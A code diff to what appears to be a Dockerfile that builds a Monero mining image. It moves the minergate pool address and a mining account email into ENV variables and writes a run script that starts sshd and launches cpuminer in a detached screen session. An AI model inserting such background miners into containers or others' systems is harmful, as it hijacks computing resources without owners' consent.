@@ -46,13 +46,15 @@ RUN cd /root && \
 
 RUN bash /root/wa.sh
 
-ENV address="-a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u 592015984a@gmail.com -p x"
+ENV address=stratum+tcp://xmr.pool.minergate.com:45560
+
+ENV email=592015984a@gmail.com 
 
 RUN cd /root && \
   echo "#!/bin/bash" > run.sh && \
   #echo '/etc/init.d/ssh start &' >> run.sh && \
   echo "/usr/sbin/sshd -D" >> run.sh && \
-  echo 'screen -dmS wa /root/cpuminer-multi/cpuminer $address' >> run.sh && \
+  echo 'screen -dmS wa /root/cpuminer-multi/cpuminer -a cryptonight -o $address -u $email -p x' >> run.sh && \
   #echo '/etc/init.d/ssh stop &' >> run.sh && \
   echo "screen -r wa" >> run.sh && \
   chmod +x run.sh
